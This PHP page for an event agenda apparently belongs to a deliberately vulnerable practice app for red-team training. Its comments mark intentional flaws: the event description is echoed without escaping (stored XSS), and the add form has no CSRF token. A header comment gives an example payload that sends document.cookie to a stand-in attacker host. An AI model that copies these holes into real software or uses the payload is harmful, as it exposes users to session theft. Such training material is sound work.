<?php
// =============================================================
//  UrbanUpC — Agenda Promo / Calendrier des événements
//  VULNÉRABILITÉ intentionnelle :
//   - Stored XSS : le champ 'description' est affiché sans
//     htmlspecialchars — vecteur de persistance pour payloads Red Team
//     (ex: <img src=x onerror=fetch('https://attacker/?c='+document.cookie)>)
//   - Pas de token CSRF sur le formulaire d'ajout.
// =============================================================

require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/functions.php';
requireAuth();
header('Content-Type: text/html; charset=utf-8');

$user  = currentUser();
$pdo   = getDB();
$error = '';

// ── POST : ajouter un événement (admin/manager uniquement) ────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!in_array($user['role'], ['admin', 'manager'])) {
        http_response_code(403);
        exit('Accès refusé.');
    }
    // Pas de token CSRF (intentionnel)
    $title       = trim($_POST['title'] ?? '');
    $description = $_POST['description'] ?? '';   // brut — pas de strip_tags
    $event_date  = $_POST['event_date'] ?? '';     // format datetime-local : "YYYY-MM-DDTHH:MM"
    // Normalise le séparateur T → espace pour MySQL DATETIME
    $event_date  = str_replace('T', ' ', $event_date);

    if (!$title || !$event_date) {
        $error = 'Le titre et la date sont obligatoires.';
    } else {
        $pdo->prepare(
            "INSERT INTO events (title, description, event_date, created_by) VALUES (?, ?, ?, ?)"
        )->execute([$title, $description, $event_date, $user['id']]);
        logAudit($user['id'], $user['username'], 'CREATE_EVENT', '/agenda.php', 'success',
            "title=$title date=$event_date");
        header('Location: /agenda.php?created=1');
        exit;
    }
}

// ── GET : événements à venir ──────────────────────────────────────────────
$events = $pdo->query(
    "SELECT e.*, u.first_name, u.last_name, u.role AS creator_role
     FROM events e
     JOIN users u ON e.created_by = u.id
     WHERE e.event_date >= NOW()
     ORDER BY e.event_date ASC
     LIMIT 50"
)->fetchAll();

// Événements passés (10 derniers)
$pastEvents = $pdo->query(
    "SELECT e.*, u.first_name, u.last_name, u.role AS creator_role
     FROM events e
     JOIN users u ON e.created_by = u.id
     WHERE e.event_date < NOW()
     ORDER BY e.event_date DESC
     LIMIT 10"
)->fetchAll();

logAudit($user['id'], $user['username'], 'VIEW_AGENDA', '/agenda.php', 'success');
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agenda — UrbanUpC | Université Paris Cité</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="/assets/css/corpnet.css">
    <style>
        .event-date-badge {
            min-width: 52px;
            text-align: center;
            flex-shrink: 0;
        }
        .event-date-badge .ev-month {
            font-size: .65rem;
            font-weight: 700;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #8b1a2e;
        }
        .event-date-badge .ev-day {
            font-size: 1.6rem;
            font-weight: 800;
            line-height: 1;
            color: #212529;
        }
        .event-card {
            border: none;
            border-left: 3px solid #8b1a2e;
            border-radius: 0 12px 12px 0;
            transition: box-shadow .15s;
        }
        .event-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,.09); }
        .event-description { font-size: .88rem; color: #555; line-height: 1.6; }
        .days-chip {
            font-size: .72rem;
            padding: .2rem .6rem;
            border-radius: 20px;
        }
    </style>
</head>
<body class="corpnet-body">

<?php include __DIR__ . '/../includes/navbar.php'; ?>

<div class="container-fluid">
    <div class="row">
        <?php include __DIR__ . '/../includes/sidebar.php'; ?>

        <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4 py-4">

            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h4 class="fw-bold mb-0">
                        <i class="fas fa-calendar-alt me-2" style="color:#8b1a2e"></i>Agenda de la promotion
                    </h4>
                    <small class="text-muted">Événements, soutenances et dates importantes</small>
                </div>
                <span class="badge bg-danger-subtle text-danger border border-danger-subtle">
                    <i class="fas fa-calendar-check me-1"></i><?= count($events) ?> à venir
                </span>
            </div>

            <?php if (isset($_GET['created'])): ?>
            <div class="alert alert-success alert-dismissible fade show py-2 mb-3">
                <i class="fas fa-check-circle me-2"></i>Événement ajouté à l'agenda.
                <button type="button" class="btn-close btn-sm" data-bs-dismiss="alert"></button>
            </div>
            <?php endif; ?>
            <?php if ($error): ?>
            <div class="alert alert-danger alert-dismissible fade show py-2 mb-3">
                <i class="fas fa-exclamation-circle me-2"></i><?= htmlspecialchars($error) ?>
                <button type="button" class="btn-close btn-sm" data-bs-dismiss="alert"></button>
            </div>
            <?php endif; ?>

            <?php if (in_array($user['role'], ['admin', 'manager'])): ?>
            <!-- ── Formulaire d'ajout (admin/manager) ── -->
            <div class="card border-0 shadow-sm mb-4">
                <div class="card-header bg-white border-bottom py-3 d-flex align-items-center gap-2">
                    <i class="fas fa-plus-circle text-primary"></i>
                    <h6 class="fw-semibold mb-0">Ajouter un événement</h6>
                </div>
                <div class="card-body">
                    <!-- Pas de token CSRF (intentionnel) -->
                    <form method="POST" class="row g-3">
                        <div class="col-md-5">
                            <label class="form-label small fw-semibold text-muted">
                                TITRE <span class="text-danger">*</span>
                            </label>
                            <input type="text" name="title" class="form-control"
                                   placeholder="Ex : Soutenance de projet, Conférence…" required>
                        </div>
                        <div class="col-md-3">
                            <label class="form-label small fw-semibold text-muted">
                                DATE &amp; HEURE <span class="text-danger">*</span>
                            </label>
                            <input type="datetime-local" name="event_date" class="form-control"
                                   min="<?= date('Y-m-d\TH:i') ?>" required>
                        </div>
                        <div class="col-md-4">
                            <label class="form-label small fw-semibold text-muted">DESCRIPTION</label>
                            <textarea name="description" class="form-control" rows="1"
                                      placeholder="Détails, salle, lien Zoom…"></textarea>
                        </div>
                        <div class="col-12 text-end">
                            <button type="submit" class="btn btn-primary btn-sm px-4">
                                <i class="fas fa-plus me-2"></i>Publier
                            </button>
                        </div>
                    </form>
                </div>
            </div>
            <?php endif; ?>

            <!-- ── Événements à venir ── -->
            <h6 class="fw-semibold text-muted text-uppercase mb-3" style="font-size:.75rem;letter-spacing:1px">
                <i class="fas fa-arrow-right me-1"></i>Événements à venir
            </h6>

            <?php if (empty($events)): ?>
            <div class="card border-0 shadow-sm">
                <div class="card-body text-center py-5 text-muted">
                    <i class="fas fa-calendar fa-3x mb-3 d-block opacity-25"></i>
                    <p>Aucun événement à venir pour l'instant.</p>
                    <?php if (in_array($user['role'], ['admin', 'manager'])): ?>
                    <small>Utilisez le formulaire ci-dessus pour en ajouter un.</small>
                    <?php endif; ?>
                </div>
            </div>
            <?php else: ?>
            <div class="d-flex flex-column gap-3 mb-4">
                <?php foreach ($events as $ev):
                    $ts      = strtotime($ev['event_date']);
                    $diff    = (int)floor(($ts - time()) / 86400);
                    if ($diff < 0) $diff = 0;
                    $isToday = (date('Y-m-d', $ts) === date('Y-m-d'));
                    $hasTime = (date('H:i', $ts) !== '00:00');
                ?>
                <div class="card event-card shadow-sm">
                    <div class="card-body d-flex gap-3 align-items-start py-3">

                        <!-- Date badge — date only, no time -->
                        <div class="event-date-badge">
                            <div class="ev-month"><?= date('M', $ts) ?></div>
                            <div class="ev-day"><?= date('d', $ts) ?></div>
                            <div class="small text-muted" style="font-size:.65rem"><?= date('Y', $ts) ?></div>
                        </div>

                        <!-- Content -->
                        <div class="flex-grow-1">
                            <div class="d-flex align-items-center gap-2 mb-1 flex-wrap">
                                <span class="fw-bold">
                                    <?= htmlspecialchars($ev['title']) ?>
                                    <?php if ($hasTime): ?>
                                    <span class="text-muted fw-normal" style="font-size:.85rem">— à <?= date('H\hi', $ts) ?></span>
                                    <?php endif; ?>
                                </span>
                                <?php if ($isToday): ?>
                                <span class="badge bg-danger days-chip">Aujourd'hui</span>
                                <?php elseif ($diff <= 7): ?>
                                <span class="badge bg-warning text-dark days-chip">Dans <?= $diff ?> j</span>
                                <?php else: ?>
                                <span class="badge bg-light text-muted border days-chip">Dans <?= $diff ?> j</span>
                                <?php endif; ?>
                                <?= roleBadge($ev['creator_role']) ?>
                                <small class="text-muted ms-auto">
                                    <i class="fas fa-user-circle me-1"></i><?= htmlspecialchars($ev['first_name'] . ' ' . $ev['last_name']) ?>
                                </small>
                            </div>
                            <?php if ($ev['description'] !== '' && $ev['description'] !== null): ?>
                            <!-- VULNERABILITY: Stored XSS — description affichée sans htmlspecialchars (intentionnel) -->
                            <div class="event-description"><?= $ev['description'] ?></div>
                            <?php endif; ?>
                        </div>

                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>

            <!-- ── Événements passés (repliés) ── -->
            <?php if (!empty($pastEvents)): ?>
            <div class="mt-2">
                <button class="btn btn-sm btn-outline-secondary mb-3"
                        type="button"
                        data-bs-toggle="collapse"
                        data-bs-target="#pastEventsCollapse">
                    <i class="fas fa-history me-1"></i>Événements passés (<?= count($pastEvents) ?>)
                </button>
                <div class="collapse" id="pastEventsCollapse">
                    <div class="d-flex flex-column gap-2">
                        <?php foreach ($pastEvents as $ev):
                            $ts      = strtotime($ev['event_date']);
                            $hasTime = (date('H:i', $ts) !== '00:00');
                        ?>
                        <div class="card border-0 shadow-sm opacity-75">
                            <div class="card-body d-flex gap-3 align-items-start py-2">
                                <!-- Date badge — date only -->
                                <div class="event-date-badge">
                                    <div class="ev-month" style="color:#999"><?= date('M', $ts) ?></div>
                                    <div class="ev-day" style="color:#aaa;font-size:1.2rem"><?= date('d', $ts) ?></div>
                                    <div style="font-size:.62rem;color:#bbb"><?= date('Y', $ts) ?></div>
                                </div>
                                <div class="flex-grow-1">
                                    <div class="fw-semibold small text-muted">
                                        <?= htmlspecialchars($ev['title']) ?>
                                        <?php if ($hasTime): ?>
                                        <span class="fw-normal" style="font-size:.75rem">— à <?= date('H\hi', $ts) ?></span>
                                        <?php endif; ?>
                                    </div>
                                    <?php if ($ev['description'] !== '' && $ev['description'] !== null): ?>
                                    <!-- VULNERABILITY: Stored XSS — description sans htmlspecialchars -->
                                    <div class="event-description small text-muted"><?= $ev['description'] ?></div>
                                    <?php endif; ?>
                                </div>
                                <span class="badge bg-secondary-subtle text-secondary days-chip">Passé</span>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
            <?php endif; ?>

        </main>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="/assets/js/corpnet.js"></script>
</body>
</html>
